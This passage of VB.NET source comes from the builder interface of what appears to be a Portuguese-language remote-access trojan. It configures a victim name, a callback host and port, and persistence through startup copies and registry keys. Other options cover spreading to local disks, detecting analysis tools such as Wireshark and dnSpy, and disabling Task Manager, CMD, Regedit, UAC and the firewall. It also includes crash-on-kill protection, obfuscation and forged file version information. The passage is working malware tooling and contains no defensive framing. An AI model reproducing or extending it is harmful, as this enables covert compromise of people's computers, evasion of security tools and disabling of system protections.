            TabControl1.SelectedTab = TBBloquearSites
        ElseIf TreeView1.SelectedNode.Text = "Windows" Then
            TabControl1.SelectedTab = TBWindows
        ElseIf TreeView1.SelectedNode.Text = "Shield" Then
            TabControl1.SelectedTab = TBShield
        ElseIf TreeView1.SelectedNode.Text = "Ofuscação" Then
            TabControl1.SelectedTab = TBOfuscação
        ElseIf TreeView1.SelectedNode.Text = "Descrição" Then
            TabControl1.SelectedTab = TBDescricao
        ElseIf TreeView1.SelectedNode.Text = "Finalização" Then
            TabControl1.SelectedTab = TBFinalização
        End If
    End Sub

    Private Sub RichTextBox1_LinkClicked(sender As Object, e As LinkClickedEventArgs)
        System.Diagnostics.Process.Start(e.LinkText)
    End Sub

    Private Sub CKOfuscaçao_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivarOfuscaçao.CheckedChanged
        If CKAtivarOfuscaçao.Checked Then
            txtStringOfuscador.Enabled = True
            NDQuantidadeStrings.Enabled = True
            CBStorageMethod.Enabled = True
            RandomST1.Enabled = True
        Else
            txtStringOfuscador.Enabled = False
            NDQuantidadeStrings.Enabled = False
            CBStorageMethod.Enabled = False
            RandomST1.Enabled = False
        End If
    End Sub


    Private Sub CKPolicies2_CheckedChanged(sender As Object, e As EventArgs) Handles CKPolicies2.CheckedChanged
        If CKPolicies2.Checked Then
            txtPolicies2.Enabled = True
        Else
            txtPolicies2.Enabled = False
        End If
    End Sub

    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click, PictureBox16.Click, PictureBox18.Click, PictureBox20.Click, PictureBox19.Click
        MsgBox("ESTA OPÇÃO SO FUNCIONARA SO COM PERMISSÃO DO ADMINISTRADOR DO COMPUTADOR DO USUÁRIO", MsgBoxStyle.Information, "Informações")
    End Sub

    Private Sub CKCopiarStartUp_CheckedChanged(sender As Object, e As EventArgs) Handles CKCopiarStartUp.CheckedChanged
        If CKCopiarStartUp.Checked Then
            txtNomeStartUp.Enabled = True
        Else
            txtNomeStartUp.Enabled = False
        End If
    End Sub

    Private Sub CriarStatus()
        Application.DoEvents()
        On Error Resume Next
        txtStatus.AppendText("Nome : " & txtNomeVitima.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Encryptar Host : " & CKAtivarEncryptarHost.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Host : " & txtHost.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Encryptação (Host) : " & txtEncryptHost.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Porta : " & NDPorta.Value & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Execução Atrasada : " & CKAtivarDelay.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Delay : " & NDDelaySegundos.Value & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (Processo) : " & txtNomeProcesso.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Diretório : " & CBDiretorio.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Copiar StartUp : " & CKCopiarStartUp.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (StartUp) : " & txtNomeStartUp.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("HKEY_CURRENT_USER : " & CKHKEY_CURRENT_USER.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (HKEY_USER) : " & txtHKEY_CURRENT_USER.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("HKEY_LOCAL_MACHINE : " & CKHKEY_LOCAL_MACHINE.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (HKEY_MACHINE) : " & txtHKEY_LOCAL_MACHINE.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("HKEY_USER, Policies : " & CKPolicies.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (HKEY_USER, Policies) : " & txtPolicies.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("HKEY_MACHINE, Policies : " & CKPolicies2.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (HKEY_MACHINE, Policies) : " & txtPolicies2.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Mensagem : " & CKAtivarMensagem.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Titulo : " & txtTitulo.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Mensagem (Texto) : " & txtMensagem.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Icone : " & ic & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Process Explorer : " & CKAntiProcessExplorer.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti SbieCtrl : " & CKAntiSbieCtrl.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti SpyTheSpy : " & CKAntiSpyTheSpy.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Wireshark : " & CKAntiWireshark.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti apateDNS : " & CKAntiapateDNS.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti IPBlocker : " & CKAntiIPBlocker.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti TiGeR-Firewall : " & CKAntiTiGeR_Firewall.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Smsniff : " & CKAntiSmsniff.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti exeinfoPE : " & CKAntiexeinfoPE.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti NetSnifferCs : " & CKAntiNetSnifferCs.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Sandboxie Control : " & CKAntiSandboxie_Control.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Process Hacker : " & CKAntiProcesshacker.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Gerenciador de Tarefas : " & CKAntiGerenciadorDeTarefas.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Msconfig : " & CKAntiMsconfig.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti dnSpy : " & CKAntidnSpy.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Code Reflect : " & CKAntiCodeReflect.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Reflector : " & CKAntiReflector.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti ILSpy : " & CKAntiILSpy.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Bloquear (Sites) : " & CKBlockSites.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Gerenciador de Tarefas : " & CKDesativarGerenciadorTarefas.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar CMD : " & CKDesativarCMD.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Regedit : " & CKDesativarRegedit.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Executar : " & CKDesativarExecutar.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar UAC : " & CKDesativarUAC.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Painel de Controle : " & CKDesativarPainelControle.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Opções de Pasta : " & CKDesativarOpçõesdePasta.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Menu Contexto : " & CKDesativarMenuContexto.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Barra de Tarefas : " & CKDesativarBarraDeTarefas.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Desativar Firewall : " & CKDesativarFirewall.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("For. Permissão de Administrador : " & CKPermisaoAdmin.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Protect Process [BSOD] : " & CKProtectProcess.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Excluir Arquivo (Melt) : " & CKExcluirArquivo.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Spread Disco Local : " & CKSpreadDiscoLocal.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Nome (Spread) : " & txtNomeSpreadDiscoLocal.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Agendar Servidor 1 Min. : " & CKAgendarServidor.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("UPX : " & CKUpx.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Ocutar Servidor : " & CKOcutarServidor.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Bypass Firewall Windows : " & CKBypassFirewall.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Anti Kill Process /OFF : " & CKAntiKillProcess.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Ofuscação : " & CKAtivarOfuscaçao.Checked.ToString & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Strings : " & txtStringOfuscador.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Mutex : " & txtMutex.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Storage Method : " & CBStorageMethod.Text & vbNewLine)
        ESPERA(10)
        txtStatus.AppendText("Extensão : " & CBextensão.Text & vbNewLine)
        ESPERA(10)
    End Sub

    Private Sub CKSpreadDiscoLocal_CheckedChanged(sender As Object, e As EventArgs) Handles CKSpreadDiscoLocal.CheckedChanged
        If CKSpreadDiscoLocal.Checked Then
            txtNomeSpreadDiscoLocal.Enabled = True
        Else
            txtNomeSpreadDiscoLocal.Enabled = False
        End If
    End Sub

    Private Sub CKAtivarEncryptarHost_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivarEncryptarHost.CheckedChanged
        If CKAtivarEncryptarHost.Checked Then
            txtEncryptHost.Enabled = True
            txtHost.Text = Nothing
            txtEncryptHost.Text = Nothing
        Else
            txtEncryptHost.Enabled = False
            txtEncryptHost.Text = Nothing
        End If
    End Sub

    Private Sub SalvarConfig()
        Application.DoEvents()
        On Error Resume Next
        'PARTE-01===CONEXÃO=================================================================================================================

        MdFN.CriarSubKey("Nome (Conexão)", txtNomeVitima.Text) '1

        MdFN.CriarSubKey("Encryptar (Host)", CKAtivarEncryptarHost.Checked.ToString) '2

        MdFN.CriarSubKey("Host (Conexão)", txtHost.Text) '3

        MdFN.CriarSubKey("Encryptação (Host)", txtEncryptHost.Text) '4

        MdFN.CriarSubKey("Porta (Conexão)", NDPorta.Value) '5

        MdFN.CriarSubKey("Delay", CKAtivarDelay.Checked.ToString) '6

        MdFN.CriarSubKey("Segundos", NDDelaySegundos.Value) '7

        '===================================================================================================================================

        'PARTE-02===INSTALAÇÃO=================================================================================================================

        MdFN.CriarSubKey("Nome (Processo)", txtNomeProcesso.Text) '8

        MdFN.CriarSubKey("Diretório", CBDiretorio.Text) '9

        MdFN.CriarSubKey("Copiar StartUp", CKCopiarStartUp.Checked.ToString) '10

        MdFN.CriarSubKey("Nome StartUp", txtNomeStartUp.Text) '11

        MdFN.CriarSubKey("Spread Disco Local", CKSpreadDiscoLocal.Checked.ToString) '12

        MdFN.CriarSubKey("Nome Spread Disco Local", txtNomeSpreadDiscoLocal.Text) '13

        MdFN.CriarSubKey("HKEY_CURRENT_USER", CKHKEY_CURRENT_USER.Checked.ToString) '14

        MdFN.CriarSubKey("Nome HKEY_CURRENT_USER", txtHKEY_CURRENT_USER.Text) '15

        MdFN.CriarSubKey("HKEY_LOCAL_MACHINE", CKHKEY_LOCAL_MACHINE.Checked.ToString) '16

        MdFN.CriarSubKey("Nome HKEY_LOCAL_MACHINE", txtHKEY_LOCAL_MACHINE.Text) '17

        MdFN.CriarSubKey("HKEY_CURRENT_USER, Policies", CKPolicies.Checked.ToString) '18

        MdFN.CriarSubKey("Nome HKEY_CURRENT_USER, Policies", txtPolicies.Text) '19

        MdFN.CriarSubKey("HKEY_LOCAL_MACHINE, Policies", CKPolicies2.Checked.ToString) '20

        MdFN.CriarSubKey("Nome HKEY_LOCAL_MACHINE, Policies", txtPolicies2.Text) '21

        '===================================================================================================================================

        'PARTE-03===MENSAGEM=================================================================================================================

        MdFN.CriarSubKey("Mensagem", CKAtivarMensagem.Checked.ToString) '22

        MdFN.CriarSubKey("Titulo (Mensagem)", txtTitulo.Text) '23

        MdFN.CriarSubKey("Texto (Mensagem)", txtMensagem.Text) '24

        '===================================================================================================================================

        'PARTE-04===ICONES=================================================================================================================

        MdFN.CriarSubKey("Icones", ic) '25

        '===================================================================================================================================

        'PARTE-05===ANTI-PROCESS=================================================================================================================

        MdFN.CriarSubKey("Anti Process Explorer", CKAntiProcessExplorer.Checked.ToString) '26

        MdFN.CriarSubKey("Anti SbieCtrl", CKAntiSbieCtrl.Checked.ToString) '27

        MdFN.CriarSubKey("Anti SpyTheSpy", CKAntiSpyTheSpy.Checked.ToString) '28

        MdFN.CriarSubKey("Anti Wireshark", CKAntiWireshark.Checked.ToString) '29

        MdFN.CriarSubKey("Anti apateDNS", CKAntiapateDNS.Checked.ToString) '30

        MdFN.CriarSubKey("Anti IPBlocker", CKAntiIPBlocker.Checked.ToString) '31

        MdFN.CriarSubKey("Anti TiGeR-Firewall", CKAntiTiGeR_Firewall.Checked.ToString) '32

        MdFN.CriarSubKey("Anti Smsniff", CKAntiSmsniff.Checked.ToString) '33

        MdFN.CriarSubKey("Anti exeinfoPE", CKAntiexeinfoPE.Checked.ToString) '34

        MdFN.CriarSubKey("Anti NetSnifferCs", CKAntiNetSnifferCs.Checked.ToString) '35

        MdFN.CriarSubKey("Anti Sandboxie Control", CKAntiSandboxie_Control.Checked.ToString) '36

        MdFN.CriarSubKey("Anti Process Hacker", CKAntiProcesshacker.Checked.ToString) '37

        MdFN.CriarSubKey("Anti Gerenciador de Tarefas", CKAntiGerenciadorDeTarefas.Checked.ToString) '38

        MdFN.CriarSubKey("Anti Msconfig", CKAntiMsconfig.Checked.ToString) '39

        MdFN.CriarSubKey("Anti dnSpy", CKAntidnSpy.Checked.ToString) '40

        MdFN.CriarSubKey("Anti Code Reflect", CKAntiCodeReflect.Checked.ToString) '41

        MdFN.CriarSubKey("Anti Reflector", CKAntiReflector.Checked.ToString) '42

        MdFN.CriarSubKey("Anti ILSpy", CKAntiILSpy.Checked.ToString) '43

        '===================================================================================================================================

        'PARTE-05===Bloquear-(Sites)=================================================================================================================

        MdFN.CriarSubKey("Bloquear (Sites)", CKBlockSites.Checked.ToString) '44

        Dim Store As String = String.Empty
        For Each X As ListViewItem In LVListSites.Items
            Store &= X.Text & ","
        Next
        Store = Store.Remove(Store.Length - 1)
        MdFN.CriarSubKey("Lista de Sites (Bloquear Sites)", Store) '45

        '===================================================================================================================================

        'PARTE-06===Windows=================================================================================================================

        MdFN.CriarSubKey("Desativar Gerenciador de Tarefas", CKDesativarGerenciadorTarefas.Checked.ToString) '46

        MdFN.CriarSubKey("Desativar CMD", CKDesativarCMD.Checked.ToString) '47

        MdFN.CriarSubKey("Desativar Regedit", CKDesativarRegedit.Checked.ToString) '48

        MdFN.CriarSubKey("Desativar Executar", CKDesativarExecutar.Checked.ToString) '49

        MdFN.CriarSubKey("Desativar UAC", CKDesativarUAC.Checked.ToString) '50

        MdFN.CriarSubKey("Desativar Painel de Controle", CKDesativarPainelControle.Checked.ToString) '51

        MdFN.CriarSubKey("Desativar Opções de Pasta", CKDesativarOpçõesdePasta.Checked.ToString) '52

        MdFN.CriarSubKey("Desativar Menu Contexto", CKDesativarMenuContexto.Checked.ToString) '53

        MdFN.CriarSubKey("Desativar Barra de Tarefas", CKDesativarBarraDeTarefas.Checked.ToString) '54

        MdFN.CriarSubKey("Desativar Firewall", CKDesativarFirewall.Checked.ToString) '55

        MdFN.CriarSubKey("For. Permissão de Administrador", CKPermisaoAdmin.Checked.ToString) '56

        '===================================================================================================================================

        'PARTE-07===Shield=================================================================================================================

        MdFN.CriarSubKey("Protect Process [BSOD]", CKProtectProcess.Checked.ToString) '57

        MdFN.CriarSubKey("Excluir Arquivo (Melt)", CKExcluirArquivo.Checked.ToString) '58

        MdFN.CriarSubKey("Agendar Servidor 1 Min.", CKAgendarServidor.Checked.ToString) '59

        MdFN.CriarSubKey("UPX", CKUpx.Checked.ToString) '60

        MdFN.CriarSubKey("Ocutar Servidor", CKOcutarServidor.Checked.ToString) '61

        MdFN.CriarSubKey("Bypass Firewall Windows", CKBypassFirewall.Checked.ToString) '63

        MdFN.CriarSubKey("Anti Kill Process /OFF", CKAntiKillProcess.Checked.ToString) '64

        '===================================================================================================================================

        'PARTE-08===OFUSCAÇÃO=================================================================================================================

        MdFN.CriarSubKey("Ativar (Ofuscaçao)", CKAtivarOfuscaçao.Checked.ToString) '71

        MdFN.CriarSubKey("Strings (Ofuscaçao)", txtStringOfuscador.Text) '72

        MdFN.CriarSubKey("Quantidade (Ofuscaçao)", NDQuantidadeStrings.Value) '73

        MdFN.CriarSubKey("Mutex (Ofuscaçao)", txtMutex.Text) '74

        MdFN.CriarSubKey("Storage Method (Ofuscaçao)", CBStorageMethod.Text) '75

        '===================================================================================================================================

        'PARTE-11===FINALIZAÇÃO=================================================================================================================

        MdFN.CriarSubKey("Extensão (Binder)", CBextensão.Text) '83

    End Sub

    Private Sub RDPergunta_CheckedChanged(sender As Object, e As EventArgs) Handles RDPergunta.CheckedChanged
        MsgBoxIcones = MessageBoxIcon.Question
    End Sub

    Private Sub RDErro_CheckedChanged(sender As Object, e As EventArgs) Handles RDErro.CheckedChanged
        MsgBoxIcones = MessageBoxIcon.Error
    End Sub

    Private Sub RDAtencao_CheckedChanged(sender As Object, e As EventArgs) Handles RDAtencao.CheckedChanged
        MsgBoxIcones = MessageBoxIcon.Exclamation
    End Sub

    Private Sub RDInformacao_CheckedChanged(sender As Object, e As EventArgs) Handles RDInformacao.CheckedChanged
        MsgBoxIcones = MessageBoxIcon.Information
    End Sub

    Private Sub RDNenhum_CheckedChanged(sender As Object, e As EventArgs) Handles RDNenhum.CheckedChanged
        MsgBoxIcones = MessageBoxIcon.None
    End Sub
    '==============================================================================================================
    Private Sub RBButtonOk_CheckedChanged(sender As Object, e As EventArgs) Handles RBButtonOk.CheckedChanged
        MsgBoxButao = MessageBoxButtons.OK
    End Sub

    Private Sub TBButtonOkCencelar_CheckedChanged(sender As Object, e As EventArgs) Handles TBButtonOkCencelar.CheckedChanged
        MsgBoxButao = MessageBoxButtons.OKCancel
    End Sub

    Private Sub RBButtonRepetirCancelar_CheckedChanged(sender As Object, e As EventArgs) Handles RBButtonRepetirCancelar.CheckedChanged
        MsgBoxButao = MessageBoxButtons.RetryCancel
    End Sub

    Private Sub RBButtonSimNao_CheckedChanged(sender As Object, e As EventArgs) Handles RBButtonSimNao.CheckedChanged
        MsgBoxButao = MessageBoxButtons.YesNo
    End Sub

    Private Sub RBButtonSimNaoCancelar_CheckedChanged(sender As Object, e As EventArgs) Handles RBButtonSimNaoCancelar.CheckedChanged
        MsgBoxButao = MessageBoxButtons.YesNoCancel
    End Sub

    Private Sub RBButtonAnularRepetirIgnorar_CheckedChanged(sender As Object, e As EventArgs) Handles RBButtonAnularRepetirIgnorar.CheckedChanged
        MsgBoxButao = MessageBoxButtons.AbortRetryIgnore
    End Sub

    '=================================================================================================================================================================================




    '=============================================================================================================================================================================

    Public Function ListarTodasCores() As List(Of String)
        Dim colors As New List(Of String)()
        Dim colorNames As String() = [Enum].GetNames(GetType(KnownColor))
        For Each colorName As String In colorNames
            Dim knownColor As KnownColor = DirectCast([Enum].Parse(GetType(KnownColor), colorName), KnownColor)
            If knownColor > knownColor.Transparent Then
                colors.Add(colorName)
            End If
        Next
        Return colors
    End Function

    Private Sub CBCores_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CBCores.SelectedIndexChanged
        Try
            PLPreviaCores.BackColor = Color.FromName(CBCores.SelectedItem)
        Catch ex As Exception

        End Try
    End Sub

    '==================================================================================================================================================================================

    Private Sub btnGerarMutex_Click(sender As Object, e As EventArgs) Handles btnGerarMutex.Click
        For N As Integer = 0 To 10
            Application.DoEvents()
            ESPERA(10)
            txtMutex.Text = String.Format("{0000}-{0001}-{0002}-{0003}-{0004}", "{" & GEN(4, 29), GEN(4, 20), GEN(4, 40), GEN(4, 30), GEN(4, 60) & "}")
        Next
    End Sub




    Private Sub CBIcones_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CBIcones.SelectedIndexChanged
        If CBIcones.SelectedIndex = 0 Then
            LVIcones.View = View.LargeIcon
        ElseIf CBIcones.SelectedIndex = 1 Then
            LVIcones.View = View.Details
        ElseIf CBIcones.SelectedIndex = 2 Then
            LVIcones.View = View.SmallIcon
        ElseIf CBIcones.SelectedIndex = 3 Then
            LVIcones.View = View.List
        ElseIf CBIcones.SelectedIndex = 4 Then
            LVIcones.View = View.Tile
        End If
    End Sub

    Private Sub btnListarPadraoIcones_Click(sender As Object, e As EventArgs) Handles btnListarPadraoIcones.Click

        If Not Directory.Exists(Application.StartupPath & "\Icones") Then
            Directory.CreateDirectory(Application.StartupPath & "\Icones")
            MsgBox("NÃO EXISTE ICONES NA PASTA ICONES", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        End If

        Dim IIIII As String() = Split(CBTamanhoICO.Text, ",")

        IM3.ImageSize = New Size(IIIII(0), IIIII(1))
        LVIcones.Items.Clear()
        For Each i As String In Directory.GetFiles(Application.StartupPath & "\Icones", "*.ico", SearchOption.AllDirectories)
            Application.DoEvents()
            Thread.Sleep(10)
            IM3.Images.Add(Icon.ExtractAssociatedIcon(i))
            Dim n As New ListViewItem
            n.Text = (Path.GetFileName(i))
            n.SubItems.Add(Path.GetFullPath(i))
            n.ImageIndex = IM3.Images.Count - 1
            LVIcones.Items.Add(n)

            lbIcones.Text = "Icones (" & LVIcones.Items.Count & ")"
        Next

    End Sub

    Private Sub LVIcones_SelectedIndexChanged(sender As Object, e As EventArgs) Handles LVIcones.SelectedIndexChanged
        For Each N As ListViewItem In LVIcones.SelectedItems
            If File.Exists(N.SubItems(1).Text) Then
                ic = N.SubItems(1).Text
                PicIco.Image = Image.FromFile(ic)
            Else
                MsgBox("ESTE ICONE NÃO EXISTE", MsgBoxStyle.Exclamation, "Informações")
                N.Remove()
            End If
        Next
    End Sub

    Private Sub RandomST1_ValueChanged(sender As Object) Handles RandomST1.ValueChanged
        Application.DoEvents()
        txtStringOfuscador.Text = StringOfuscador(NDQuantidadeStrings.Value)
    End Sub

    Private Sub CKAtivardescricao_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivardescricao.CheckedChanged
        If CKAtivardescricao.Checked Then
            GroupBox9.Enabled = True
        Else
            GroupBox9.Enabled = False
        End If
    End Sub

    Private Sub btnGerarDescricao_Click(sender As Object, e As EventArgs) Handles btnGerarDescricao.Click
        TXT_Descricao.Text = GEN(20, 30)
        TXT_Nome.Text = GEN(20, 20)
        TXT_Produto.Text = GEN(20, 35)
        TXT_Copyright.Text = GEN(20, 40)
        TXT_Marca.Text = GEN(20, 10)
        N1.Value = GENUMERIC()
        N2.Value = GENUMERIC()
        N3.Value = GENUMERIC()
        N4.Value = GENUMERIC()
        N5.Value = GENUMERIC()
        N6.Value = GENUMERIC()
        N7.Value = GENUMERIC()
        N8.Value = GENUMERIC()
    End Sub

    '===============


    Private Sub MinhaDescricao(ByVal Nome As String)
        Try
            Application.DoEvents()
            If File.Exists(Application.StartupPath & "\res.exe") Then
                File.Delete(Application.StartupPath & "\res.exe")
            End If
            Thread.Sleep(50)
            File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
            Thread.Sleep(50)
            Dim source As String = My.Resources.Descrição
            Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
            Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
            Dim cResults As CompilerResults
            Dim Settings As New CompilerParameters()
            With Settings
                .GenerateExecutable = True
                .OutputAssembly = Application.StartupPath & "\" & TXT_Nome.Text & ".exe"
                .CompilerOptions = "/target:winexe"
                .ReferencedAssemblies.Add("System.dll")
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .MainClass = "X"
            End With
            source = source.Replace("*Title*", TXT_Descricao.Text)
            source = source.Replace("*Company*", TXT_Nome.Text)
            source = source.Replace("*Product*", TXT_Produto.Text)
            source = source.Replace("*Copyright*", TXT_Copyright.Text)
            source = source.Replace("*Trademark*", TXT_Marca.Text)
            source = source.Replace("*version*", N1.Value.ToString & "." & N2.Value.ToString & "." & N3.Value.ToString & "." & N4.Value.ToString)
            source = source.Replace("*fversion*", N5.Value.ToString & "." & N6.Value.ToString & "." & N7.Value.ToString & "." & N8.Value.ToString)
            cResults = Compiler.CompileAssemblyFromSource(Settings, source)

            Dim otherfile As String = Application.StartupPath & "\" & TXT_Nome.Text & ".exe"
            Dim resfile As String = Application.StartupPath & "\" & TXT_Nome.Text & ".res"
            Dim mainfile As String = Nome

            Shell("res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide, True, -1)
            Shell("res.exe -delete " & mainfile & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide, True, -1)
            Shell("res.exe -addoverwrite " & mainfile & "," & mainfile & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide, True, -1)

            If File.Exists(Application.StartupPath & "\" & TXT_Nome.Text & ".exe") Then
                File.Delete(Application.StartupPath & "\" & TXT_Nome.Text & ".exe")
            End If
            If File.Exists(Application.StartupPath & "\" & TXT_Nome.Text & ".res") Then
                File.Delete(Application.StartupPath & "\" & TXT_Nome.Text & ".res")
            End If
            If File.Exists(Application.StartupPath & "\res.exe") = True Then
                File.Delete(Application.StartupPath & "\res.exe")
            End If
            If File.Exists(Application.StartupPath & "\res.log") = True Then
                File.Delete(Application.StartupPath & "\res.log")
            End If
            If File.Exists(Application.StartupPath & "\res.ini") = True Then
                File.Delete(Application.StartupPath & "\res.ini")
            End If

        Catch ex As Exception
            MsgBox("ERRO : OCORREU UM ERRO AO TROCA A DESCRIÇÃO DO ARQUIVO", MsgBoxStyle.Critical, "Informações")
        End Try
    End Sub

    Private Sub TabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles TabControl1.SelectedIndexChanged

    End Sub
    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub
End Class




